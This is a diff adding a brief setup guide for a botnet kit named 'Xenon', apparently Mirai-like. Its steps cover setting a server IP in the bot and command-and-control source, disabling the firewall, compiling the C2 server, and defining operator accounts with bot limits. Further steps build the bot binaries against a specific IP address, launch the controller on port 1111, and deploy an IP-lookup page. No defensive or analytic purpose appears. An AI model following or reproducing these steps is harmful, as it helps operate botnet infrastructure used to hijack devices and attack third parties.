@@ -1,0 +1,15 @@
+put Server IP in main.c and cnc.c
+
+yum install gcc screen nano httpd python perl -y; ulimit -n 999999
+
+iptables -F; service iptables stop
+
+gcc cnc.c -o Xenon -pthread
+
+nano login.txt   put User PASS admin access maxtime max bots
+
+python Xenon.py fff 134.122.111.155 Xenon bins
+
+screen ./Xenon 1111 1 420 
+
+mv iplookup.php /var/www/html/; yum install php -y; service httpd restart
